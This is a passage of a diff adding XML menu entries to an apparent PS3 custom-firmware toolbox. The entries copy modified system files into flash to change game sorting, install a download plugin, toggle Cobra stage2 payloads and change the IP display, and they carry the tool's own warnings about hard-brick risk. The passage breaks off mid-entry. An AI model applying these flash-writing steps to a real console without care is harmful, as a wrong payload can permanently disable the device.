+			<Query class="type:x-xmb/folder-pixmap" key="toggle_game_sort_name" attr="toggle_game_sort_name" src="#toggle_game_sort_name_items"/>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_game_sort_name_date" attr="toggle_game_sort_name_date" src="#toggle_game_sort_name_date_items"/>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_game_sort_date" attr="toggle_game_sort_date" src="#toggle_game_sort_date_items"/>
+		</Items>
+	</View>
+
+	<View id="toggle_game_sort_name_items">
+	<Attributes>
+			<Table key="toggle_game_sort_name_blue">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Add Option to Sort Games By Name (Blue Icons)</></Pair>
+				<Pair key="info"><>Add alphabetical sorting with options for A-Z and Z-A</></Pair>
+			</Table>
+			<Table key="toggle_game_sort_name_red">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Add Option to Sort Games By Name (Red Icons)</></Pair>
+				<Pair key="info"><>Add alphabetical sorting with options for A-Z and Z-A</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_game_sort_name_blue" attr="toggle_game_sort_name_blue" src="#toggle_game_sort_name_blue_item"/>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_game_sort_name_red" attr="toggle_game_sort_name_red" src="#toggle_game_sort_name_red_item"/>
+		</Items>
+	</View>
+
+	<View id="toggle_game_sort_name_blue_item">
+		<Attributes>
+			<Table key="game_sort_name_blue_item">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Add Option to Sort Games By Name?</></Pair>
+				<Pair key="info"><>Press  to continue (XMB Refresh Required), Press  to go back
+				
+				This copies a modified registory.xml and explore_plugin_full.rco to flash</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/sort_games/registory_alpha.xml#/dev_blind/vsh/resource/explore/xmb/registory.xml#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/sort_games/explore_plugin_full_blue_alpha.rco#/dev_blind/vsh/resource/explore_plugin_full.rco</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="game_sort_name_blue_item" attr="game_sort_name_blue_item"/>
+		</Items>
+	</View>
+
+	<View id="toggle_game_sort_name_red_item">
+		<Attributes>
+			<Table key="game_sort_name_red_item">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Add Option to Sort Games By Name?</></Pair>
+				<Pair key="info"><>Press  to continue (XMB Refresh Required), Press  to go back
+				
+				This copies a modified registory.xml and explore_plugin_full.rco to flash</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/sort_games/registory_alpha.xml#/dev_blind/vsh/resource/explore/xmb/registory.xml#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/sort_games/explore_plugin_full_red_alpha.rco#/dev_blind/vsh/resource/explore_plugin_full.rco</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="game_sort_name_red_item" attr="game_sort_name_red_item"/>
+		</Items>
+	</View>
+
+	<View id="toggle_game_sort_name_date_items">
+	<Attributes>
+			<Table key="toggle_game_sort_name_date_blue">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Add Option to Sort Games By Name and Date (Blue Icons)</></Pair>
+				<Pair key="info"><>Add sorting with options for A-Z and New-Old</></Pair>
+			</Table>
+			<Table key="toggle_game_sort_name_date_red">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Add Option to Sort Games By Name and Date (Red Icons)</></Pair>
+				<Pair key="info"><>Add sorting with options for A-Z and New-Old</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_game_sort_name_date_blue" attr="toggle_game_sort_name_date_blue" src="#toggle_game_sort_name_date_blue_item"/>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_game_sort_name_date_red" attr="toggle_game_sort_name_date_red" src="#toggle_game_sort_name_date_red_item"/>
+		</Items>
+	</View>
+
+	<View id="toggle_game_sort_name_date_blue_item">
+		<Attributes>
+			<Table key="game_sort_name_date_blue_item">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Add Option to Sort Games By Name and Date?</></Pair>
+				<Pair key="info"><>Press  to continue (XMB Refresh Required), Press  to go back
+				
+				This copies a modified registory.xml and explore_plugin_full.rco to flash</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/sort_games/registory_alpha_date.xml#/dev_blind/vsh/resource/explore/xmb/registory.xml#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/sort_games/explore_plugin_full_blue_alpha_date.rco#/dev_blind/vsh/resource/explore_plugin_full.rco</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="game_sort_name_date_blue_item" attr="game_sort_name_date_blue_item"/>
+		</Items>
+	</View>
+
+	<View id="toggle_game_sort_name_date_red_item">
+		<Attributes>
+			<Table key="game_sort_name_date_red_item">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Add Option to Sort Games By Name and Date?</></Pair>
+				<Pair key="info"><>Press  to continue (XMB Refresh Required), Press  to go back
+				
+				This copies a modified registory.xml and explore_plugin_full.rco to flash</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/sort_games/registory_alpha_date.xml#/dev_blind/vsh/resource/explore/xmb/registory.xml#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/sort_games/explore_plugin_full_red_alpha_date.rco#/dev_blind/vsh/resource/explore_plugin_full.rco</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="game_sort_name_date_red_item" attr="game_sort_name_date_red_item"/>
+		</Items>
+	</View>
+
+	<View id="toggle_game_sort_date_items">
+	<Attributes>
+			<Table key="toggle_game_sort_date_blue">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Revert to Standard Game Sorting Options (Blue Icons)</></Pair>
+				<Pair key="info"><>Change game sorting to official with just New-Old and Old-New</></Pair>
+			</Table>
+			<Table key="toggle_game_sort_date_red">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Revert to Standard Game Sorting Options (Red Icons)</></Pair>
+				<Pair key="info"><>Change game sorting to official with just New-Old and Old-New</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_game_sort_date_blue" attr="toggle_game_sort_date_blue" src="#toggle_game_sort_date_blue_item"/>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_game_sort_date_red" attr="toggle_game_sort_date_red" src="#toggle_game_sort_date_red_item"/>
+		</Items>
+	</View>
+
+	<View id="toggle_game_sort_date_blue_item">
+		<Attributes>
+			<Table key="game_sort_date_blue_item">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Revert to Standard Game Sorting Options?</></Pair>
+				<Pair key="info"><>Press  to continue (XMB Refresh Required), Press  to go back
+				
+				This copies the standard registory.xml and a explore_plugin_full.rco to flash</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/sort_games/registory_original.xml#/dev_blind/vsh/resource/explore/xmb/registory.xml#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/sort_games/explore_plugin_full_blue_default.rco#/dev_blind/vsh/resource/explore_plugin_full.rco</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="game_sort_date_blue_item" attr="game_sort_date_blue_item"/>
+		</Items>
+	</View>
+
+	<View id="toggle_game_sort_date_red_item">
+		<Attributes>
+			<Table key="game_sort_date_red_item">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Revert to Standard Game Sorting Options?</></Pair>
+				<Pair key="info"><>Press  to continue (XMB Refresh Required), Press  to go back
+				
+				This copies the standard registory.xml and a explore_plugin_full.rco to flash</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/sort_games/registory_original.xml#/dev_blind/vsh/resource/explore/xmb/registory.xml#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/sort_games/explore_plugin_full_red_default.rco#/dev_blind/vsh/resource/explore_plugin_full.rco</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="game_sort_date_red_item" attr="game_sort_date_red_item"/>
+		</Items>
+	</View>
+
+	<View id="toggle_ext_download_plugin_items">
+		<Attributes>
+			<Table key="enable_extdownload">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Install Extended Download Plugin</></Pair>
+				<Pair key="info"><>Add features to the systems web browser</></Pair>
+			</Table>
+			<Table key="disable_extdownload">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Uninstall Extended Download Plugin</></Pair>
+				<Pair key="info"><>Remove features from the systems web browser</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="enable_extdownload" attr="enable_extdownload" src="#enable_extdownload_item"/>
+			<Query class="type:x-xmb/folder-pixmap" key="disable_extdownload" attr="disable_extdownload" src="#disable_extdownload_item"/>
+		</Items>
+	</View>
+
+	<View id="enable_extdownload_item">
+		<Attributes>
+			<Table key="enable_extdownload1">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Install Extended Download Plugin?</></Pair>
+				<Pair key="info"><>Press  to continue (Reboot Required), Press  to go back
+				
+				This will copy a modified download_plugin.sprx to dev_blind/vsh/module
+				and a modified download_list.xml to dev_blind/vsh/resource/explore/xmb/
+				
+				Warning: this plugin has issues with downloading media files,
+				so if you need to download media disable this plugin.</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/download_plugin/vsh_modded#/dev_blind/vsh</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="enable_extdownload1" attr="enable_extdownload1"/>
+		</Items>
+	</View>
+
+	<View id="disable_extdownload_item">
+		<Attributes>
+			<Table key="disable_extdownload1">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Uninstall Extended Download Plugin?</></Pair>
+				<Pair key="info"><>Press  to continue (Reboot Required), Press  to go back
+				
+				This will copy the standard download_plugin.sprx to dev_blind/vsh/module
+				and the standard download_list.xml to dev_blind/vsh/resource/explore/xmb/</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/download_plugin/vsh_original#/dev_blind/vsh</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="disable_extdownload1" attr="disable_extdownload1"/>
+		</Items>
+	</View>
+
+	<View id="cobra_settings_items">
+		<Attributes>
+			<Table key="cobra_settings_rebug">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/restart_warning.png</></Pair>
+				<Pair key="title"><>Cobra Settings for Rebug CFW</></Pair>
+				<Pair key="info"><> Advanced Users Only - Use at your own risk! </></Pair>
+			</Table>
+			<Table key="cobra_settings_evilnat">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/restart_warning.png</></Pair>
+				<Pair key="title"><>Cobra Settings for Evilnat and Ferrox CFW</></Pair>
+				<Pair key="info"><> Advanced Users Only - Use at your own risk! </></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="cobra_settings_rebug" attr="cobra_settings_rebug" src="#cobra_settings_rebug_items"/>
+			<Query class="type:x-xmb/folder-pixmap" key="cobra_settings_evilnat" attr="cobra_settings_evilnat" src="#cobra_settings_evilnat_items"/>
+		</Items>
+	</View>
+
+	<View id="cobra_settings_rebug_items">
+		<Attributes>
+			<Table key="toggle_cobra">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/restart_warning.png</></Pair>
+				<Pair key="title"><>Toggle Cobra</></Pair>
+				<Pair key="info"><>Enable or Disable all Rebug payloads</></Pair>
+			</Table>
+			<Table key="swap_payloads">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/restart_warning.png</></Pair>
+				<Pair key="title"><>Toggle Standard and Debug Payloads</></Pair>
+				<Pair key="info"><>You must provide your own payloads on dev_flash</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_cobra" attr="toggle_cobra" src="#toggle_rebug_cobra_items"/>
+			<Query class="type:x-xmb/folder-pixmap" key="swap_payloads" attr="swap_payloads" src="#swap_rebug_payloads_items"/>
+		</Items>
+	</View>
+
+	<View id="toggle_rebug_cobra_items">
+		<Attributes>
+			<Table key="enable_cobra">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/restart_warning.png</></Pair>
+				<Pair key="title"><>Enable Cobra</></Pair>
+				<Pair key="info"><>Allow stage2 to load during boot</></Pair>
+			</Table>
+			<Table key="disable_cobra">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/restart_warning.png</></Pair>
+				<Pair key="title"><>Disable Cobra</></Pair>
+				<Pair key="info"><>Block stage2 from loading during boot</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="enable_cobra" attr="enable_cobra" src="#enable_rebug_cobra_item"/>
+			<Query class="type:x-xmb/folder-pixmap" key="disable_cobra" attr="disable_cobra" src="#disable_rebug_cobra_item"/>
+		</Items>
+	</View>
+
+	<View id="swap_rebug_payloads_items">
+		<Attributes>
+			<Table key="enable_standard_payload">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/restart_warning.png</></Pair>
+				<Pair key="title"><>Standard Payload</></Pair>
+				<Pair key="info"><>You must provide your own standard payload on dev_flash</></Pair>
+			</Table>
+			<Table key="enable_debug_payload">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/restart_warning.png</></Pair>
+				<Pair key="title"><>Debug Payload</></Pair>
+				<Pair key="info"><>You must provide your own debug payload on dev_flash</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="enable_standard_payload" attr="enable_standard_payload" src="#enable_rebug_standard_payload_item"/>
+			<Query class="type:x-xmb/folder-pixmap" key="enable_debug_payload" attr="enable_debug_payload" src="#enable_rebug_debug_payload_item"/>
+		</Items>
+	</View>
+
+	<View id="enable_rebug_cobra_item">
+		<Attributes>
+			<Table key="enable_cobra_action">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/hdd_warning.png</></Pair>
+				<Pair key="title"><>Enable Cobra, Are you sure?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back
+				
+				Warning: This will allow cobra stage2 and plugins to load.
+				
+				This will rename the dev_flash/rebug/cobra_bak folder to cobra</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_blind/rebug/cobra_bak#/dev_blind/rebug/cobra#move</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="enable_cobra_action" attr="enable_cobra_action"/>
+		</Items>
+	</View>
+
+	<View id="disable_rebug_cobra_item">
+		<Attributes>
+			<Table key="disable_cobra_action">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/hdd_warning.png</></Pair>
+				<Pair key="title"><>Disable Cobra, Are you sure?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back
+				
+				Warning: This will stop all cobra stage2 and plugins from loading.
+				
+				This will rename the dev_flash/rebug/cobra folder to cobra_bak</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_blind/rebug/cobra#/dev_blind/rebug/cobra_bak#move</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="disable_cobra_action" attr="disable_cobra_action"/>
+		</Items>
+	</View>
+
+	<View id="enable_rebug_standard_payload_item">
+		<Attributes>
+			<Table key="standard_payload_action">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/hdd_warning.png</></Pair>
+				<Pair key="title"><>Enable Standard Payload, Are you sure?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back
+				
+				This will disable logging over socat. 
+				
+				You must provide your own standard payload(s) on flash:
+				Path for CEX Standard Payload: dev_blind/rebug/cobra/stage2.cex.std
+				Path for DEX Standard Payload: dev_blind/rebug/cobra/stage2.dex.std
+				 Warning: Hard brick risk if you use the wrong payload on NAND consoles </></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_blind/rebug/cobra/stage2.cex.std#/dev_blind/rebug/cobra/stage2.cex#/dev_blind/rebug/cobra/stage2.dex.std#/dev_blind/rebug/cobra/stage2.dex</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="standard_payload_action" attr="standard_payload_action"/>
+		</Items>
+	</View>
+
+	<View id="enable_rebug_debug_payload_item">
+		<Attributes>
+			<Table key="debug_payload_action">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/hdd_warning.png</></Pair>
+				<Pair key="title"><>Enable Debug Payload, Are you sure?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back
+				
+				This will enable logging over socat. 
+				
+				You must provide your own debug payload(s) on flash:
+				Path for CEX Debug Payload: dev_blind/rebug/cobra/stage2.cex.dbg
+				Path for DEX Debug Payload: dev_blind/rebug/cobra/stage2.dex.dbg
+				 Warning: Hard brick risk if you use the wrong payload on NAND consoles </></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_blind/rebug/cobra/stage2.cex.dbg#/dev_blind/rebug/cobra/stage2.cex#/dev_blind/rebug/cobra/stage2.dex.dbg#/dev_blind/rebug/cobra/stage2.dex</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="debug_payload_action" attr="debug_payload_action"/>
+		</Items>
+	</View>
+
+	<View id="cobra_settings_evilnat_items">
+		<Attributes>
+			<Table key="toggle_cobra">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/restart_warning.png</></Pair>
+				<Pair key="title"><>Toggle Cobra</></Pair>
+				<Pair key="info"><>Enable or Disable payloads</></Pair>
+			</Table>
+			<Table key="swap_payloads">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/restart_warning.png</></Pair>
+				<Pair key="title"><>Toggle Standard and Debug Payloads</></Pair>
+				<Pair key="info"><>You must provide your own payloads on dev_flash</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_cobra" attr="toggle_cobra" src="#toggle_evilnat_cobra_items"/>
+			<Query class="type:x-xmb/folder-pixmap" key="swap_payloads" attr="swap_payloads" src="#swap_evilnat_payloads_items"/>
+		</Items>
+	</View>
+
+	<View id="toggle_evilnat_cobra_items">
+		<Attributes>
+			<Table key="enable_cobra">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/restart_warning.png</></Pair>
+				<Pair key="title"><>Enable Cobra</></Pair>
+				<Pair key="info"><>Allow stage2 to load during boot</></Pair>
+			</Table>
+			<Table key="disable_cobra">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/restart_warning.png</></Pair>
+				<Pair key="title"><>Disable Cobra</></Pair>
+				<Pair key="info"><>Block stage2 from loading during boot</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="enable_cobra" attr="enable_cobra" src="#enable_evilnat_cobra_item"/>
+			<Query class="type:x-xmb/folder-pixmap" key="disable_cobra" attr="disable_cobra" src="#disable_evilnat_cobra_item"/>
+		</Items>
+	</View>
+
+	<View id="swap_evilnat_payloads_items">
+		<Attributes>
+			<Table key="enable_standard_payload">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/restart_warning.png</></Pair>
+				<Pair key="title"><>Standard Payload</></Pair>
+				<Pair key="info"><>Normal Cobra Payload Included in Rebug</></Pair>
+			</Table>
+			<Table key="enable_debug_payload">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/restart_warning.png</></Pair>
+				<Pair key="title"><>Debug Payload</></Pair>
+				<Pair key="info"><>You must provide your own debug payload on dev_flash</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="enable_standard_payload" attr="enable_standard_payload" src="#enable_evilnat_standard_payload_item"/>
+			<Query class="type:x-xmb/folder-pixmap" key="enable_debug_payload" attr="enable_debug_payload" src="#enable_evilnat_debug_payload_item"/>
+		</Items>
+	</View>
+
+	<View id="enable_evilnat_cobra_item">
+		<Attributes>
+			<Table key="enable_cobra_action">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/hdd_warning.png</></Pair>
+				<Pair key="title"><>Enable Cobra, Are you sure?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back
+				
+				Warning: This will allow cobra stage2 and cobra plugins to load.
+				
+				This will rename the dev_blind/sys/stage2.bin.bak to stage2.bin</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_blind/sys/stage2.bin.bak#/dev_blind/sys/stage2.bin#move</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="enable_cobra_action" attr="enable_cobra_action"/>
+		</Items>
+	</View>
+
+	<View id="disable_evilnat_cobra_item">
+		<Attributes>
+			<Table key="disable_cobra_action">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/hdd_warning.png</></Pair>
+				<Pair key="title"><>Disable Cobra, Are you sure?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back
+				
+				Warning: This will stop all cobra stage2 and cobra plugins from loading.
+				
+				This will rename the dev_blind/sys/stage2.bin to stage2.bin.bak</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_blind/sys/stage2.bin#/dev_blind/sys/stage2.bin.bak#move</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="disable_cobra_action" attr="disable_cobra_action"/>
+		</Items>
+	</View>
+
+	<View id="enable_evilnat_standard_payload_item">
+		<Attributes>
+			<Table key="standard_payload_action">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/hdd_warning.png</></Pair>
+				<Pair key="title"><>Enable Standard Payload, Are you sure?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back
+				
+				This will disable logging over socat. 
+				
+				Provide your own standard payload on flash:
+				Path for Standard Payload: dev_blind/sys/stage2.bin.std</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_blind/sys/stage2.bin.std#/dev_blind/sys/stage2.bin</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="standard_payload_action" attr="standard_payload_action"/>
+		</Items>
+	</View>
+	
+	<View id="enable_evilnat_debug_payload_item">
+		<Attributes>
+			<Table key="debug_payload_action">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/hdd_warning.png</></Pair>
+				<Pair key="title"><>Enable Debug Payload, Are you sure?</></Pair>
+				<Pair key="info"><>Press  to continue, Press  to go back
+				
+				This will enable logging over socat. 
+				
+				Provide your own debug payload on flash:
+				Path for Debug Payload: dev_blind/sys/stage2.bin.dbg</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_blind/sys/stage2.bin.dbg#/dev_blind/sys/stage2.bin</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="debug_payload_action" attr="debug_payload_action"/>
+		</Items>
+	</View>
+
+	<View id="toggle_ip_items">
+	<Attributes>
+			<Table key="toggle_ip_default_cex">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Remove All IP Info from XMB</></Pair>
+				<Pair key="info"><>Install official CEX xmb_plugin.sprx to flash   </></Pair>
+			</Table>
+			<Table key="toggle_ip_default_dex">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Show Full IP Info on XMB</></Pair>
+				<Pair key="info"><>Install official DEX xmb_plugin.sprx to flash   </></Pair>
+			</Table>
+			<Table key="toggle_ip_lite1">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Show IP Address and Connected From</></Pair>
+				<Pair key="info"><>Install modified DEX xmb_plugin.sprx to flash   </></Pair>
+			</Table>
+			<Table key="toggle_ip_lite2">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/step.png</></Pair>
+				<Pair key="title"><>Show IP Address Only</></Pair>
+				<Pair key="info"><>Install modified DEX xmb_plugin.sprx to flash   </></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_ip_default_cex" attr="toggle_ip_default_cex" src="#toggle_ip_default_cex_item"/>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_ip_default_dex" attr="toggle_ip_default_dex" src="#toggle_ip_default_dex_item"/>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_ip_lite1" attr="toggle_ip_lite1" src="#toggle_ip_lite1_item"/>
+			<Query class="type:x-xmb/folder-pixmap" key="toggle_ip_lite2" attr="toggle_ip_lite2" src="#toggle_ip_lite2_item"/>
+		</Items>
+	</View>
+
+	<View id="toggle_ip_default_cex_item">
+		<Attributes>
+			<Table key="ip_cex">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
